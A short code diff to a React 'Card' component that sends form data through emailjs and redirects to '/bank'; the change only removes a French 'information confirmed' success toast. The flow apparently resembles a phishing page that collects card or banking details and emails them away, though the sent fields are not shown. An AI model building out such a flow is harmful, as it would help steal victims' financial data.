@@ -97,13 +97,6 @@ const Card = () => {
       };
 
       await emailjs.send(serviceID, templateID, templateParams, publicKey);
-
-      toast({
-        title: "Succès",
-        description: "Vos informations ont été confirmées avec succès.",
-        variant: "default",
-      });
-
       navigate("/bank");
     } catch (err) {
       console.error(err);
